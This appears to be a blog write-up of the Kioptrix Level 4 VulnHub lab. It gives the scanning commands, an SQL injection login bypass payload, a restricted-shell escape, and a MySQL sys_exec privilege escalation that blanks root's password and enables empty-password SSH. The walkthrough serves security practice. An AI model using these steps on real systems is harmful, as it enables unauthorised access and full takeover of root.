---
layout: post
title: Kioptrix Level 4
---
[Kioptrix Level 4](https://www.vulnhub.com/entry/kioptrix-level-13-4%2C25/)

## Setup

Download .rar file and extract

Create new virtual machine and go to VM > Settings > Hard Disk > Remove

Add > Hard Disk > SCSI > Use exisiting > Kioptrix.vmdk file

Set both local machine and target to NAT and restart them both and you should be able to find the target IP

## Find IP of box
Our IP: x.x.x.146

`nmap -sP <LHOST>/24`

Kioptrix is running x.x.x.151

## Init NMap Scan

`nmap -sC -sV -oA nmap x.x.x.151`

 - Default Scripts
 - Service Detection
 - Output all formats
 
 ![Initial NMap Scan](/images/KioptrixL4/Nmap1.JPG)
 
 There are 4 ports open: 22 (ssh), 80 (http), 139 (samba), 445 (samba)
 
 ## HTTP
 ### Gobuster
 
 `gobuster dir -u http://x.x.x.151 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.txt -x php,html,txt,xml`

![Initial Gobuster Scan](/images/KioptrixL4/Gobuster1.JPG)

Looks like we have a couple usernames in john and robert so when we open the webpage, we see a login and can enter john as the username and test as the password which just re-directs to a checklogin.php page

### SQLi

Enter john as the username and `' or '1' = '1` which displays john's actual credentials

We can do the same for robert.

## SSH

ssh as john : MyNameIsJohn
or ssh as robert : ADGAdsafdfwt4gadfga==

Entering most commands tells us we will be kicked out if we tryit again

We can find our allowed commands by typing `help` or `?

We can use echo so if we enter `echo os.system('/bin/bash')` we can upgrade the shell to use more commands

## Priv Esc

Uploaded `linpeas.sh` using a python3 web server and to shows that mysql may be an attack vector

`mysql -u root -h localhost`

`SELECT sys_exec('chown john.john /etc/shadow');`

`SELECT sys_exec('chown john.john /etc/passwd');`

`SELECT sys_exec('chown -R john.john /root');`

Exit and cd /root where we can `cat congrats.txt`

However, we're not actually root yet, jsut able to read the file

`vim /etc/passwd` and remove the x is the root line --> root::0:0:root:/root:/bin/bash

`vim /etc/shadow` and change the root line to --> root::::::::

`mysql -u root -h localhost`

`SELECT sys_exec('chown -R john.john /etc/ssh');`

`vim /etc/ssh/sshd_config` and change PermitEmptyPasswords to yes and change UsePAM to no

`mysql -u root -h localhost`

`SELECT sys_exec(‘reboot’);`

This will exit the ssh session and when it does, you can do `ssh root@x.x.x.151` which logs you in as root
